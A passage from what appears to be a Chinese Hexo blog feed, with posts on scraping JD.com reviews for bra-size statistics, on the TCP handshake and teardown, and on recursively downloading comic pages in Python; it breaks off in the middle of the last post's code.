    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
<li>最近闲来无事，又正好在学习Python数据分析统计，于是便萌生一种想法：统计京东购买记录，分析全国女性平均Size</li>
</ul>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>首先查询京东网站，输入查询内容xz，查到87万+商品</li>
<li>购买size可以在评论区找到（就摆在那儿，那也太简单了，后面才知道我想多了。。。）<br><img src="https://img-blog.csdnimg.cn/20200327095835323.png" alt="在这里插入图片描述"></li>
<li>先看域名，发现每一个域名的构成都是<a href="https://item.jd.com/%E7%84%B6%E5%90%8E%E5%8A%A0%E4%B8%80%E4%B8%B2%E6%95%B0%E5%AD%97.html%EF%BC%8C%E7%BB%8F%E9%AA%8C%E5%91%8A%E8%AF%89%E6%88%91%EF%BC%8C%E8%BF%99%E4%B8%B2%E6%95%B0%E5%AD%97%E4%B8%80%E5%AE%9A%E6%98%AF%E5%95%86%E5%93%81id%E3%80%82">https://item.jd.com/然后加一串数字.html，经验告诉我，这串数字一定是商品id。</a></li>
<li>找id的话就要到搜索页面找了，果然，在分析搜索页面之后，发现id就躺在静态页面中。<img src="https://img-blog.csdnimg.cn/20200327095929529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>思路有了，准备写代码。。。</li>
</ul>
<h2 id="开始码代码"><a href="#开始码代码" class="headerlink" title="开始码代码"></a>开始码代码</h2><ul>
<li>第一步当然是获取id了，通过分析搜索域名（不得不说jd的反爬机制，唉，这里不好评价，自行体会，分析过程如下。）<img src="https://img-blog.csdnimg.cn/2020032709595885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>需要注意的就是keyword，wq（全拼），还有后面的page和s，这几个参数是改变的<blockquote>
<p>keyword传入商品名称，wq传入商品全拼，page传入商品页（jd是按照奇数排序）,s的话，需要计算，见代码。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爬取商品id</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&#x27;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_id</span>(<span class="params">key_word,wq</span>):</span></span><br><span class="line">    <span class="comment">#jd_url=&#x27;https://search.jd.com/Search?keyword=%E5%A5%B3%E6%80%A7%E5%86%85%E8%A1%A3&amp;enc=utf-8&amp;wq=%E5%A5%B3%E6%80%A7nei%27yi&amp;pvid=fafd7af082734ae1a4a6cb674f98b2e4&#x27;</span></span><br><span class="line">    jd_url = <span class="string">&#x27;https://search.jd.com/Search&#x27;</span></span><br><span class="line">    product_ids = []</span><br><span class="line">    <span class="comment"># 爬前3页的商品</span></span><br><span class="line">    j = <span class="number">51</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>,<span class="number">25</span>,<span class="number">2</span>):</span><br><span class="line">        param = &#123;<span class="string">&#x27;keyword&#x27;</span>: key_word, <span class="string">&#x27;enc&#x27;</span>: <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;qrst&#x27;</span>:<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;rt&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;stop&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;vt&#x27;</span>:<span class="number">2</span>, <span class="string">&#x27;wq&#x27;</span>:wq, <span class="string">&#x27;page&#x27;</span>:i, <span class="string">&#x27;s&#x27;</span>:j, <span class="string">&#x27;click&#x27;</span>:<span class="number">0</span>&#125;</span><br><span class="line">        response = requests.get(jd_url,params = param,headers=headers)</span><br><span class="line">        <span class="comment"># 商品id</span></span><br><span class="line">        ids = re.findall(<span class="string">&#x27;data-pid=&quot;(.*?)&quot;&#x27;</span>, response.text,re.S)</span><br><span class="line">        product_ids += ids</span><br><span class="line">        <span class="keyword">if</span> i!= <span class="number">3</span>:</span><br><span class="line">            j = j+<span class="number">50</span>+i<span class="number">-4</span>;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j+=<span class="number">50</span></span><br><span class="line">    <span class="keyword">return</span> product_ids</span><br></pre></td></tr></table></figure></li>
<li>获取id之后我们进入页面，准备获取评价里的购买尺寸，用静态网站方法爬一下，正则表达式分析一手，发现根本无法获得购买尺寸，再一看，获取的html页面中根本没有评价内容，经验告诉我这是通过json接口传入的。</li>
<li>于是，就开始了我的找接口。。。。（此处省略两个小时）</li>
<li>在我的不懈努力下，终于找到了接口。。。<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDMvMjcvbFZrUVNMZ2hLQ0dudHF2LnBuZw?x-oss-process=image/format,png" alt="图片.png"></li>
<li>下面分析接口url（也不难）。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDMvMjcvR0JPVjJiSHl0OEF4cDRuLnBuZw?x-oss-process=image/format,png" alt="图片.png">- 分析并不难，直接上代码，这次没有用params的参数，而是用的字符串拼接，因为params一直报错，搞了好久。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爬取Size</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSizes</span>(<span class="params">ids</span>):</span></span><br><span class="line">    Sizes = []</span><br><span class="line">    <span class="keyword">for</span> id <span class="keyword">in</span> ids:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">            url = <span class="string">&#x27;https://club.jd.com/comment/productPageComments.action?callback=fetchJSON_comment98&amp;productId=&#x27;</span>+id+<span class="string">&#x27;&amp;score=0&amp;sortType=5&amp;page=&#x27;</span>+str(i)+<span class="string">&#x27;&amp;pageSize=10&amp;isShadowSku=0&amp;fold=1&#x27;</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            size = re.findall(<span class="string">&#x27;&quot;productSize&quot;:&quot;(.*?)&quot;&#x27;</span>,response.text)</span><br><span class="line">            Sizes+=size</span><br><span class="line">    <span class="keyword">return</span> Sizes</span><br></pre></td></tr></table></figure>
<ul>
<li>爬取Size后，发现Size并不统一，有的用XXL，有的用ABC，所以需要清洗一下获取的数据，如下</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#数据清洗（统一尺码）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unified</span>(<span class="params">str</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;E&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;E&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;D&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;D&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;C&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;B&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;B&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;A&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XXL&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;E&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XL&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;D&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;L&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;M&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;B&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;S&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;A&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;均码&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;B&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;大&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;小&#x27;</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>搞定这一切后，想要对Size进行分析，但是我感觉直接在PyCharm里面分析有点难看，好吧，主要是想用上最近学的juty notebook。于是我便把获取到的数据先写入MySQL，再转到juty notebook进行分析。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#运行并写入数据库</span></span><br><span class="line">conn = pymysql.connect(host=<span class="string">&#x27;localhost&#x27;</span>,user=<span class="string">&#x27;root&#x27;</span>,password=<span class="string">&#x27;123&#x27;</span>,database=<span class="string">&#x27;size&#x27;</span>,port=<span class="number">3306</span>) <span class="comment">#连接数据库</span></span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">ids = get_id(<span class="string">&quot;胸罩&quot;</span>,<span class="string">&quot;xiong&#x27;zhao&quot;</span>) <span class="comment">#获取id</span></span><br><span class="line">Sizes = getSizes(ids) <span class="comment">#获取sizes</span></span><br><span class="line">Sizes_flush = [] </span><br><span class="line"><span class="keyword">for</span> size <span class="keyword">in</span> Sizes:  <span class="comment">#清洗Sizes</span></span><br><span class="line">    <span class="keyword">if</span> unified(size) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        Sizes_flush+=unified(size)</span><br><span class="line">        sql = <span class="string">&quot;INSERT INTO jd_size(size) values(&#x27;&quot;</span> + unified(size) + <span class="string">&quot;&#x27;);&quot;</span></span><br><span class="line">        cursor.execute(sql)  <span class="comment">#入库</span></span><br><span class="line">        conn.commit()</span><br></pre></td></tr></table></figure>
<h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><ul>
<li>首先连接数据库并读入数据<br><img src="https://img-blog.csdnimg.cn/20200327093937468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>然后对获取到的数据进行分类汇总<br><img src="https://img-blog.csdnimg.cn/20200327094126886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>汇总之后就明显可以看出来，B占大多数了，然后开始绘制一下饼图。<img src="https://img-blog.csdnimg.cn/20200327094236284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>果然，B占一半以上，接下来再绘制一下直方图。<img src="https://img-blog.csdnimg.cn/20200327094332838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h2 id="至此，我们的分析项目就完成了，经统计，全国女性大多为B杯。"><a href="#至此，我们的分析项目就完成了，经统计，全国女性大多为B杯。" class="headerlink" title="至此，我们的分析项目就完成了，经统计，全国女性大多为B杯。"></a>至此，我们的分析项目就完成了，经统计，全国女性大多为B杯。</h2><blockquote>
<p>完整项目代码见<a href="https://github.com/lrffun/My_Python/tree/master/Size">https://github.com/lrffun/My_Python/tree/master/Size</a></p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>爬虫笔记</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>连三次握手，四次挥手都不知道，还敢说自己是学IT的？</title>
    <url>/2020/05/14/%E8%BF%9E%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%EF%BC%8C%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B%E9%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%EF%BC%8C%E8%BF%98%E6%95%A2%E8%AF%B4%E8%87%AA%E5%B7%B1%E6%98%AF%E5%AD%A6IT%E7%9A%84%EF%BC%9F/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
<li>众所周知，TCP（传输控制协议）是面向连接的、高可靠的、基于字节流的运输层传输协议。不像UDP传输时直接把东西丢给对方，TCP建立传输连接时需要严格的三次握手，释放连接时也需要四次挥手。那么这三次握手和四次挥手又是啥东西呢？</li>
</ul>
<h1 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h1><h2 id="三次握手概述"><a href="#三次握手概述" class="headerlink" title="三次握手概述"></a>三次握手概述</h2><ul>
<li>所谓三次握手就是TCP连接建立时需要在客户和服务器之间交换三个TCP报文段。</li>
<li>其目的在于<ol>
<li>要使每一方能够明确知道对方的存在，就像拉朋友打游戏前——“在？”，“在”，“鸡？”，“来”。</li>
<li>要允许双方协商一些参数（如最大窗口值、最大报文段长度MSS、是否使用窗口扩大选项和时间戳选项以及服务质量等）——“啥地图？”，“海岛就成。”</li>
<li>能够对运输实体资源（如缓存大小、连接表中的项目等）进行分配——“有时间打吧，别一会儿挂机了”，“有”。<h2 id="三次握手过程"><a href="#三次握手过程" class="headerlink" title="三次握手过程"></a>三次握手过程</h2><h4 id="第一次握手"><a href="#第一次握手" class="headerlink" title="第一次握手"></a>第一次握手</h4><img src="https://img-blog.csdnimg.cn/2020051410371668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="第一次握手"></li>
</ol>
</li>
<li>第一次握手由客户端发起，向服务端发出请求报文，其中同步位SYN为1，表示这是个请求报文，seq为序号，然后等待服务器确认，此时客户端进入SYN_SENT状态。<h4 id="第二次握手"><a href="#第二次握手" class="headerlink" title="第二次握手"></a>第二次握手</h4><img src="https://img-blog.csdnimg.cn/20200514104536737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="第二次握手"></li>
<li>第二次握手由服务端发出，对客户端的请求表示确认ACK=1表示确认，同意连接，ack = x+1表示确认收到前x序号内容。同时服务端再发送一个SYN包，请求客户端的确认，seq置为y，表明传输数据时的第一个字节序号。SYN+ACK包发送完毕，服务端进入SYN_RECV状态。<h4 id="第三次握手"><a href="#第三次握手" class="headerlink" title="第三次握手"></a>第三次握手</h4><img src="https://img-blog.csdnimg.cn/20200514105519696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><ul>
<li>客户端收到服务器给出的报文段后发出ACK包对其进行确认，ack=y+1，seq=x+1，此报文段发送完毕后，连接建立成功，开始传输数据，双方进入ESTAB-LISHED状态。<br><img src="https://img-blog.csdnimg.cn/20200514110034998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h2 id="为什么要第进行三次握手（要对确认进行确认）？"><a href="#为什么要第进行三次握手（要对确认进行确认）？" class="headerlink" title="为什么要第进行三次握手（要对确认进行确认）？"></a>为什么要第进行三次握手（要对确认进行确认）？</h2></li>
<li>为了防止已失效的连接请求报文段突然又传送到了，因而产生错误。</li>
<li>如果采取两次握手，相当于第二次握手结束便建立连接，如果发送SYN的一方不想连接了，也不会有反馈，另一方却一直在等待，浪费了时间。当然可以采取4次甚至N次握手，但是有必要吗？建立连接的时间太长，效果也会大打折扣。所以3次只是折中方案，保证了可靠性，又节俭了建立连接的时间。（摘自<a href="https://www.cnblogs.com/xiaofei1/archive/2019/04/09/10676699.html">小飞</a>）<h1 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h1><h2 id="四次挥手概述（原因）"><a href="#四次挥手概述（原因）" class="headerlink" title="四次挥手概述（原因）"></a>四次挥手概述（原因）</h2></li>
<li>数据传输结束后，通信双方要释放连接</li>
<li>由于TCP连接是全双工的，因此每个方向都必须单独进行关闭。</li>
<li>这原则是当一方完成它的数据发送任务后就能发送一个FIN来终止这个方向的连接。收到一个 FIN只意味着这一方向上没有数据流动，一个TCP连接在收到一个FIN后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。<h2 id="四次挥手过程"><a href="#四次挥手过程" class="headerlink" title="四次挥手过程"></a>四次挥手过程</h2><h4 id="第一次挥手"><a href="#第一次挥手" class="headerlink" title="第一次挥手"></a>第一次挥手</h4><img src="https://img-blog.csdnimg.cn/2020051411104299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="第一次挥手"></li>
<li>客户端首先发送FIN报文段（连接释放报文段），主动关闭客户端到服务器的数据传输，FIN置为1，其序号seq=u，并等待B的确认。<h4 id="第二次挥手"><a href="#第二次挥手" class="headerlink" title="第二次挥手"></a>第二次挥手</h4><img src="https://img-blog.csdnimg.cn/20200514111525258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="第二次挥手"></li>
</ul>
</li>
</ul>
<ul>
<li>服务端收到客户端的连接释放报文段，对其发出确认，发回一个ACK确认报文，确认号收到的序号加一即u+1，此时从客户端到服务器方向的连接就释放完成，TCP连接处于半关闭状态，如果服务器端仍要发送数据，那么客户端依旧需要接收。</li>
</ul>
<h4 id="第三次挥手"><a href="#第三次挥手" class="headerlink" title="第三次挥手"></a>第三次挥手</h4><p><img src="https://img-blog.csdnimg.cn/2020051411214499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="第三次挥手"></p>
<ul>
<li>第三次挥手依旧由服务端发出，类似第一次挥手，如果服务端没有要向客户端发送的数据了，应用进程通知TCP释放连接，同时发送一个FIN报文，ACK置为1，seq序号置为w，确认号ack置为u+1。</li>
</ul>
<h4 id="第四次挥手"><a href="#第四次挥手" class="headerlink" title="第四次挥手"></a>第四次挥手</h4><p><img src="https://img-blog.csdnimg.cn/20200514114545420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="第四次挥手"></p>
<ul>
<li>客户端收到服务端的FIN报文，对其进行确认，发出确认报文，确认号置ack为w+1，自己的序号seq=u+1。至此，虽然完成了四次挥手但连接并未完全释放。必须经过时间2MSL后才能真正释放掉。<h4 id="四次挥手中客户端服务端各状态"><a href="#四次挥手中客户端服务端各状态" class="headerlink" title="四次挥手中客户端服务端各状态"></a>四次挥手中客户端服务端各状态</h4><img src="https://img-blog.csdnimg.cn/20200514115042729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h2 id="为什么要经过2MSL时间才能释放"><a href="#为什么要经过2MSL时间才能释放" class="headerlink" title="为什么要经过2MSL时间才能释放"></a>为什么要经过2MSL时间才能释放</h2></li>
</ul>
<ol>
<li>为了保证A发送的最后一个ACK报文段能够到达B</li>
<li>防止已失效的连接请求报文段出现在本连接中</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><ul>
<li>三次握手和四次挥手讲解完毕。</li>
<li>如有错误的地方，请大佬指正。</li>
<li>转载请注明出处。</li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>递归爬漫画</title>
    <url>/2020/10/24/%E9%80%92%E5%BD%92%E7%88%AC%E6%BC%AB%E7%94%BB/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
<li>好吧，我摊牌，写本篇文章的目的是为了蹭1024的徽章。虽然这样说，但读者依旧可以从中学到一些知识，比如，递归在爬虫中的应用，递归是编程中非常重要的内容，很多算法都离不开递归，本篇文章将为你讲解以递归代替循环来实现爬取漫画的所有章节，文章结尾附上全部代码。</li>
</ul>
<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><ul>
<li>偶然想起初中爱看的一本漫画，名字叫做《偷星九月天》，当初真的是对这本漫画爱不释手，每天都期盼着更新。多年后的今天，想用代码爬下来所有章节重刷第n遍。</li>
<li>功能要求：能够将一本漫画的所有章节下载下来，并将每个章节分开存放在不同文件夹。</li>
<li>拓展要求：输入漫画名字，第几话到第几话自动下载所有页面。</li>
</ul>
<h1 id="找资源"><a href="#找资源" class="headerlink" title="找资源"></a>找资源</h1><h2 id="找到符合爬虫要求的漫画网"><a href="#找到符合爬虫要求的漫画网" class="headerlink" title="找到符合爬虫要求的漫画网"></a>找到符合爬虫要求的漫画网</h2><ul>
<li>比如某些网站它的图片存放地址为<a href="https://xxx.xxx.xxx/%E5%81%B7%E6%98%9F%E4%B9%9D%E6%9C%88%E5%A4%A9/1.jpg">https://xxx.xxx.xxx/偷星九月天/1.jpg</a>  ，那我们就可以很轻易地得到所有图片。h2 id="分析地址"><a href="#分析地址" class="headerlink" title="分析地址"></a>分析地址</h2></li>
<li>分析图片地址，然后如果一般情况，写个循环就能开爬了，但这次我们用递归的方法。详细介绍见代码。<h1 id="码代码"><a href="#码代码" class="headerlink" title="码代码"></a>码代码</h1><h2 id="getPage（Name，a，b）"><a href="#getPage（Name，a，b）" class="headerlink" title="getPage（Name，a，b）"></a>getPage（Name，a，b）</h2></li>
<li>函数用处：得到所有话。</li>
<li>参数说明：</li>
</ul>
<ol>
<li>Name：漫画名字。</li>
<li>a：从a话开始。</li>
<li>b：到b话截至。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPage</span>(<span class="params">Name,a,b</span>):</span></span><br><span class="line">    <span class="keyword">for</span> Hua <span class="keyword">in</span> range(a,b+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> recursiveDownload(Name,Hua,<span class="number">1</span>):</span><br><span class="line">            print(<span class="string">&quot;第&quot;</span>+str(Hua)+<span class="string">&quot;话下载完毕。&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="recursiveDownload-Name-Hua-page"><a href="#recursiveDownload-Name-Hua-page" class="headerlink" title="recursiveDownload(Name,Hua,page)"></a>recursiveDownload(Name,Hua,page)</h2></li>
</ol>
<ul>
<li>函数用处：递归得到本话的所有页，递归终止条件：访问失败（没有下一页了）。</li>
<li>参数说明：</li>
</ul>
<ol>
<li>Name：漫画名字。</li>
<li>Hua：第几话。</li>
<li>page：第几页。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recursiveDownload</span>(<span class="params">Name,Hua,page</span>):</span></span><br><span class="line">    Url = re.sub(<span class="string">&quot;漫画名字&quot;</span>, Name, MyUrl)</span><br><span class="line">    Url = re.sub(<span class="string">&quot;多少话&quot;</span>, str(Hua) + <span class="string">&quot;话&quot;</span>, Url)</span><br><span class="line">    Url = re.sub(<span class="string">&quot;#&quot;</span>, str(page), Url)</span><br><span class="line">    <span class="keyword">if</span> download(Name, Url, Hua, page):</span><br><span class="line">        recursiveDownload(Name,Hua,page+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<h2 id="download-Name-Url-Hua-page"><a href="#download-Name-Url-Hua-page" class="headerlink" title="download(Name, Url, Hua, page)"></a>download(Name, Url, Hua, page)</h2><ul>
<li>函数说明：将获取到的漫画页下载到电脑上。</li>
<li>参数说明：</li>
</ul>
<ol>
<li>Name：漫画名字。</li>
<li>Url：页面地址。</li>
<li>Hua：第几话。</li>
<li>page：第几页。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">Name, Url, Hua, page</span>):</span></span><br><span class="line">    response = requests.get(Url, headers=mHeaders)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&quot;G:\\漫画\\&quot;</span> + Name + <span class="string">&quot;\\&quot;</span> + str(Hua)):</span><br><span class="line">            open(<span class="string">&quot;G:\\漫画\\&quot;</span> + Name + <span class="string">&quot;\\&quot;</span> + str(Hua) + <span class="string">&quot;\\&quot;</span> + str(page) + <span class="string">&quot;.jpg&quot;</span>, <span class="string">&#x27;wb&#x27;</span>).write(response.content)</span><br><span class="line">            print(str(Hua) + <span class="string">&quot;\\&quot;</span> + str(page) + <span class="string">&quot;.jpg&quot;</span> + <span class="string">&quot;下载完成！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            os.mkdir(<span class="string">&quot;G:\\漫画\\&quot;</span> + Name + <span class="string">&quot;\\&quot;</span> + str(Hua))</span><br><span class="line">            open(<span class="string">&quot;G:\\漫画\\&quot;</span> + Name + <span class="string">&quot;\\&quot;</span> + str(Hua) + <span class="string">&quot;\\&quot;</span> + str(page) + <span class="string">&quot;.jpg&quot;</span>, <span class="string">&#x27;wb&#x27;</span>).write(response.content)</span><br><span class="line">            print(Name + <span class="string">&quot;第&quot;</span> + str(Hua) + <span class="string">&quot;话\\&quot;</span> + str(page) + <span class="string">&quot;.jpg&quot;</span> + <span class="string">&quot;下载完成！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;连接错误！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h1 id="全部代码"><a href="#全部代码" class="headerlink" title="全部代码"></a>全部代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">主题：网页爬虫下载偷星九月天全部漫画。</span></span><br><span class="line"><span class="string">时间：2020/10/1  —— 入手新键盘后的第一个项目</span></span><br><span class="line"><span class="string">作者：Nero</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">MyUrl = <span class="string">&quot;https://xxx.xxx.com/comic/D/漫画名字/多少话/#.jpg-kmh.middle&quot;</span></span><br><span class="line"></span><br><span class="line">mHeaders = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#x27;</span></span><br><span class="line">&#125;</span><br><span 